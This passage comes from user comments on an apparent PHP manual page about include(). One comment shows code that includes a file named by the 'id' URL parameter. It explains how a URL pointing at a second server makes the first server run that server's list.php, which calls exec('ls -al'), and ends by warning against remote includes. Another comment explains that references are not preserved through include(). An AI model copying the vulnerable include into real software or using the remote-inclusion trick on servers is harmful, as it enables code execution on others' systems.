-</span><span class="keyword">include (</span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'id'</span><span class="keyword">].</span><span class="string">".php"</span><span class="keyword">);<br />
-</span><span class="default">?&gt;<br />
-</span><br />
-This is, of course, not a very good way to program, but i actually found a program doing this.<br />
-<br />
-Then, we hava a server B, also Linux with PHP installed, that has the file list.php with the following code:<br />
-<br />
-<span class="default">&lt;?php<br />
-</span><span class="comment">// File: list.php<br />
-</span><span class="default">$output </span><span class="keyword">= </span><span class="string">""</span><span class="keyword">;<br />
-</span><span class="default">exec</span><span class="keyword">(</span><span class="string">"ls -al"</span><span class="keyword">,</span><span class="default">$output</span><span class="keyword">);<br />
-foreach(</span><span class="default">$output </span><span class="keyword">as </span><span class="default">$line</span><span class="keyword">) {<br />
-echo </span><span class="default">$line </span><span class="keyword">. </span><span class="string">"&lt;br&gt;\n"</span><span class="keyword">;<br />
-}<br />
-</span><span class="default">?&gt;<br />
-</span><br />
-If index.php on Server A is called like this: <a href="http://server_a/index.php?id=http://server_b/list" rel="nofollow" target="_blank">http://server_a/index.php?id=http://server_b/list</a><br />
-then Server B will execute list.php and Server A will include the output of Server B, a list of files.<br />
-<br />
-But here's the trick: if Server B doesn't have PHP installed, it returns the file list.php to Server A, and Server A executes that file. Now we have a file listing of Server A! <br />
-I tried this on three different servers, and it allways worked.<br />
-This is only an example, but there have been hacks uploading files to servers etc.<br />
-<br />
-So, allways be extremely carefull with remote includes.</span>
-</code>
-    </div>
-   </div>
-  </div>
- <div class="foot"></div>
-  <a name="38128""></a>
-  <div class="note">
-   <strong class="user">james at gogo dot co dot nz</strong>
-   <a href="#38128" class="date">09-Dec-2003 10:03</a>
-   <div class="text">
-    <div class="phpcode">
-<code><span class="html">
-While you can return a value from an included file, and receive the value as you would expect, you do not seem to be able to return a reference in any way (except in array, references are always preserved in arrays).<br />
-<br />
-For example, we have two files, file 1.php contains...<br />
-<span class="default">&lt;?php<br />
-&nbsp; </span><span class="keyword">function &amp;</span><span class="default">x</span><span class="keyword">(&amp;</span><span class="default">$y</span><span class="keyword">)<br />
-&nbsp; {<br />
-&nbsp;&nbsp;&nbsp; return include(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">) . </span><span class="string">'/2.php'</span><span class="keyword">);<br />
-&nbsp; }<br />
-<br />
-&nbsp; </span><span class="default">$z </span><span class="keyword">= </span><span class="string">"FOO\n"</span><span class="keyword">;<br />
-&nbsp; </span><span class="default">$z2 </span><span class="keyword">= &amp;</span><span class="default">x</span><span class="keyword">(</span><span class="default">$z</span><span class="keyword">);<br />
-<br />
-&nbsp; echo </span><span class="default">$z2</span><span class="keyword">;<br />
-&nbsp; </span><span class="default">$z&nbsp; </span><span class="keyword">= </span><span class="string">"NOO\n"</span><span class="keyword">;<br />
-&nbsp; <br />
-&nbsp; echo </span><span class="default">$z2</span><span class="keyword">;<br />
-</span><span class="default">?&gt;<br />
-</span><br />
-and file 2.php contains...<br />
-<span class="default">&lt;?php&nbsp; </span><span class="keyword">return </span><span class="default">$y</span><span class="keyword">; </span><span class="default">?&gt;<br />
-</span><br />
-calling 1.php will produce<br />
-<br />
-FOO<br />
-FOO<br />
-<br />
-i.e the reference passed to x() is broken on it's way out of the include()<br />
-<br />
-Neither can you do something like <span class="default">&lt;?php $foo </span><span class="keyword">=&amp; include(....); </span><span class="default">?&gt;</span> as that's a parse error (include is not a real function, so can't take a reference in that case).&nbsp; And you also can't do <span class="default">&lt;?php </span><span class="keyword">return &amp;</span><span class="default">$foo ?&gt;</span> in the included file (parse error again, nothing to assign the reference too).<br />
-<br />
-The only solutions are to set a variable with the reference which the including code can then return itself, or return an array with the reference inside.<br />
-<br />
----<br />
-James Sleeman<br />
-<a href="http://www.gogo.co.nz/" rel="nofollow" target="_blank">http://www.gogo.co.nz/</a></span>
 </code>
     </div>
    </div>
